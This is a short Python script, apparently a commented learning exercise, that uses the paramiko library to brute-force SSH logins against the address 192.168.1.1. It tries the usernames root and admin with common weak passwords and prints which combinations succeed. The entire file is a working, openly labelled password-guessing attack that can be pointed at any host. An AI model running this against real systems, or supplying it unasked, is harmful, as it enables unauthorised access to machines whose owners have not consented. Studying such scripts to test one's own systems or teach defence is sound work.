import paramiko # Python Library for implementation of the SSHv2 protocol. Used here to establish SSH connections and perform authentication.

# Function to try SSH login with provided credentials containing 3 parameters(ip, username, password)
def ssh_brute_force(ip, username, password):
    ssh = paramiko.SSHClient() # creates a new Paramiko SSH client object.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #This line sets the policy for handling missing host keys.
    

    # try block to handle any exceptions that may occur during the SSH login attempt.
    try:
        ssh.connect(ip, username=username, password=password) # attempts to establish an SSH connection to the specified IP address using the provided username and password.
        print(f"Login successful: {username}:{password}")
        ssh.close() #  closes the SSH connection using the close method of the SSH client object.

        # Handles unforseen errors which might occur during authentication
    except paramiko.AuthenticationException:
        print(f"Login failed: {username}:{password}")

# Target IP and credentials list
ip_address = "192.168.1.1"
usernames = ["root", "admin"]
passwords = ["123456", "password", "admin"]

# Perform brute force attack
# nested for loop that iterates over the list of usernames and passwords.
for username in usernames:
    for password in passwords:
        ssh_brute_force(ip_address, username, password) # Calling on the SSH login function to initiate bruth force

